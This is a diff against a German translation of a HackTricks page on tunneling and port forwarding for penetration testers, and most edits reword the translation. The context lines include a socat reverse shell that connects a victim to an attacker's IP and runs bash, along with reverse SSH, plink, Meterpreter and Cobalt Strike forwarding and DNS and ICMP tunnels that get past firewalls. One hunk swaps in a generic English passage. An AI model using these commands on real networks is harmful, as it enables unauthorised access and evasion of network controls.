@@ -14,7 +14,7 @@
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -28,7 +28,7 @@
 
 ## **Bash**
 
-**Host -> Sprung -> InternA -> InternB**
+**Host -> Jump -> InternalA -> InternalB**
 ```bash
 # On the jump server connect the port 3333 to the 5985
 mknod backpipe p;
@@ -74,7 +74,7 @@ Lokaler Port --> Kompromittierter Host (SSH) --> Überall
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Umgekehrte Portweiterleitung
+### Umgekehrtes Port-Forwarding
 
 Dies ist nützlich, um umgekehrte Shells von internen Hosts über eine DMZ auf Ihren Host zu erhalten:
 ```bash
@@ -87,7 +87,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-Sie benötigen **Root-Zugriff auf beiden Geräten** (da Sie neue Schnittstellen erstellen werden) und die sshd-Konfiguration muss Root-Login erlauben:\
+Sie benötigen **Root-Zugriff auf beiden Geräten** (da Sie neue Schnittstellen erstellen werden) und die sshd-Konfiguration muss Root-Anmeldungen erlauben:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -102,13 +102,13 @@ Aktivieren Sie die Weiterleitung auf der Serverseite.
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 ```
-Setze eine neue Route auf der Client-Seite.
+Setzen Sie eine neue Route auf der Client-Seite.
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-Sie können den gesamten Datenverkehr über einen Host zu einem Teilnetzwerk über **ssh** **tunneln**.\
+Sie können den gesamten Datenverkehr zu einem Teilnetzwerk über einen Host **tunneln**.\
 Zum Beispiel, Weiterleitung des gesamten Datenverkehrs, der zu 10.10.10.0/24 geht.
 ```bash
 pip install sshuttle
@@ -130,7 +130,7 @@ portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
 ### SOCKS
 
-SOCKS (Socket Secure) ist ein Internet-Protokoll, das zur Weiterleitung von Netzwerkverkehr zwischen einem Client und einem Server in einem Proxy-Servernetzwerk verwendet wird. Es ermöglicht dem Client, Verbindungen über den Proxy herzustellen, wodurch die wahre Identität des Clients verborgen wird. SOCKS kann für Tunneling und Portweiterleitung verwendet werden.
+SOCKS (Socket Secure) ist ein Internet-Protokoll, das zur Weiterleitung von Netzwerkverkehr zwischen einem Client und einem Server in einem Proxy-Server verwendet wird. Es ermöglicht dem Client, Verbindungen durch den Proxy zu anderen Servern zu tunneln. SOCKS kann verwendet werden, um den Datenverkehr zu anonymisieren oder auf Ressourcen zuzugreifen, die normalerweise nicht verfügbar sind.
 ```bash
 background# meterpreter session
 route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
@@ -138,7 +138,19 @@ use auxiliary/server/socks_proxy
 run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
-Eine weitere Möglichkeit:
+### Tunneling and Port Forwarding
+
+Tunneling is a method that allows data to be transferred securely over a public network. It involves encapsulating the data into another protocol to create a secure communication channel. Port forwarding, on the other hand, is a technique that redirects a communication request from one address and port number combination to another while the packets are in transit.
+
+#### Tunneling
+
+Tunneling can be used to bypass firewalls and access restricted networks. It can also be used to encrypt data to ensure secure communication. Common tunneling protocols include SSH, VPN, and SSL/TLS.
+
+#### Port Forwarding
+
+Port forwarding is commonly used in NAT environments to allow external devices to access services on private networks. It can also be used to redirect traffic from one port to another, useful for accessing services on non-standard ports.
+
+Both tunneling and port forwarding are essential techniques in the field of cybersecurity, allowing for secure communication and access to restricted resources.
 ```bash
 background #meterpreter session
 use post/multi/manage/autoroute
@@ -175,7 +187,7 @@ rportfwd stop [bind port]
 ### rPort2Port lokal
 
 {% hint style="warning" %}
-In diesem Fall wird der **Port im Beacon-Host geöffnet**, nicht im Team-Server, und der **Datenverkehr wird an den Cobalt Strike-Client gesendet** (nicht an den Team-Server) und von dort aus zum angegebenen Host:Port.
+In diesem Fall wird der **Port im Beacon-Host geöffnet**, nicht im Team-Server, und der **Datenverkehr wird an den Cobalt Strike-Client gesendet** (nicht an den Team-Server) und von dort aus an den angegebenen Host:Port.
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -245,7 +257,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ### Port2Port
 
-### Port-zu-Port
+### Port2Port
 ```bash
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
@@ -289,7 +301,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-Verbinden Sie den lokalen SSH-Port (22) mit dem 443-Port des Angreiferhosts
+Verbinde den lokalen SSH-Port (22) mit dem 443-Port des Angreifer-Hosts
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -299,7 +311,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Es ist wie eine Konsolenversion von PuTTY (die Optionen ähneln sehr einem SSH-Client).
 
-Da dieses Binärfile auf dem Opfer ausgeführt wird und es sich um einen SSH-Client handelt, müssen wir unseren SSH-Dienst und Port öffnen, damit wir eine umgekehrte Verbindung herstellen können. Anschließend leiten wir nur lokal zugängliche Ports auf einen Port in unserer Maschine weiter:
+Da dieses Binärfile auf dem Opfer ausgeführt wird und es sich um einen SSH-Client handelt, müssen wir unseren SSH-Dienst und Port öffnen, damit wir eine umgekehrte Verbindung herstellen können. Anschließend leiten wir nur lokal zugängliche Ports zu einem Port auf unserer Maschine weiter:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -341,13 +353,13 @@ Jetzt bestätigen Sie auf Ihrem Rechner (Angreifer), dass der Port 1080 lauscht:
 ```
 netstat -antb | findstr 1080
 ```
-Jetzt können Sie [**Proxifier**](https://www.proxifier.com/) verwenden, **um den Datenverkehr durch diesen Port zu leiten.**
+Jetzt können Sie [**Proxifier**](https://www.proxifier.com/) verwenden, **um den Datenverkehr durch diesen Port zu tunneln.**
 
 ## Windows-GUI-Apps proxifizieren
 
 Sie können Windows-GUI-Apps dazu bringen, über einen Proxy zu navigieren, indem Sie [**Proxifier**](https://www.proxifier.com/) verwenden.\
-In **Profil -> Proxy-Server** fügen Sie die IP und den Port des SOCKS-Servers hinzu.\
-In **Profil -> Proxifizierungsregeln** fügen Sie den Namen des zu proxifizierenden Programms und die Verbindungen zu den IPs hinzu, die Sie proxifizieren möchten.
+Unter **Profil -> Proxy-Server** fügen Sie die IP und den Port des SOCKS-Servers hinzu.\
+Unter **Profil -> Proxifizierungsregeln** fügen Sie den Namen des zu proxifizierenden Programms und die Verbindungen zu den IPs hinzu, die Sie proxifizieren möchten.
 
 ## NTLM-Proxy-Umgehung
 
@@ -369,7 +381,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Jetzt, wenn Sie zum Beispiel den **SSH**-Dienst beim Opfer einstellen, um auf Port 443 zu lauschen. Sie können sich über den Angreiferport 2222 damit verbinden.\
+Jetzt, wenn Sie zum Beispiel den **SSH**-Dienst beim Opfer einstellen, um auf Port 443 zuzuhören. Sie können sich über den Angreiferport 2222 damit verbinden.\
 Sie könnten auch einen **Meterpreter** verwenden, der sich mit localhost:443 verbindet und der Angreifer auf Port 2222 lauscht.
 
 ## YARP
@@ -382,7 +394,7 @@ Ein von Microsoft erstellter Reverse-Proxy. Sie finden ihn hier: [https://github
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root ist in beiden Systemen erforderlich, um Tun-Adapter zu erstellen und Daten zwischen ihnen mithilfe von DNS-Abfragen zu tunneln.
+Root wird in beiden Systemen benötigt, um Tun-Adapter zu erstellen und Daten zwischen ihnen mithilfe von DNS-Abfragen zu tunneln.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -419,7 +431,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Ändern des Proxychains DNS
 
-Proxychains unterbricht den `gethostbyname`-libc-Aufruf und leitet die TCP-DNS-Anfrage über den Socks-Proxy um. Standardmäßig verwendet Proxychains den DNS-Server **4.2.2.2** (fest codiert). Um dies zu ändern, bearbeiten Sie die Datei: _/usr/lib/proxychains3/proxyresolv_ und ändern Sie die IP. Wenn Sie sich in einer **Windows-Umgebung** befinden, können Sie die IP des **Domänencontrollers** festlegen.
+Proxychains unterbricht den `gethostbyname`-libc-Aufruf und leitet die TCP-DNS-Anfrage durch den Socks-Proxy. Standardmäßig verwendet Proxychains den DNS-Server **4.2.2.2** (fest codiert). Um ihn zu ändern, bearbeiten Sie die Datei: _/usr/lib/proxychains3/proxyresolv_ und ändern Sie die IP. Wenn Sie sich in einer **Windows-Umgebung** befinden, könnten Sie die IP des **Domänencontrollers** festlegen.
 
 ## Tunnel in Go
 
@@ -432,7 +444,7 @@ Proxychains unterbricht den `gethostbyname`-libc-Aufruf und leitet die TCP-DNS-A
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-In beiden Systemen ist Root erforderlich, um Tunnelschnittstellen zu erstellen und Daten zwischen ihnen unter Verwendung von ICMP-Echo-Anfragen zu tunneln.
+In beiden Systemen ist Root erforderlich, um TUN-Adapter zu erstellen und Daten zwischen ihnen mithilfe von ICMP-Echo-Anfragen zu tunneln.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -522,7 +534,7 @@ addr: file:///tmp/httpbin/
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -536,6 +548,6 @@ addr: file:///tmp/httpbin/
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [HackTricks-Repository](https://github.com/carlospolop/hacktricks) und das [HackTricks-Cloud-Repository](https://github.com/carlospolop/hacktricks-cloud)** einreichen.
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks-Repository](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud-Repository](https://github.com/carlospolop/hacktricks-cloud)** einreichen.
 
 </details>
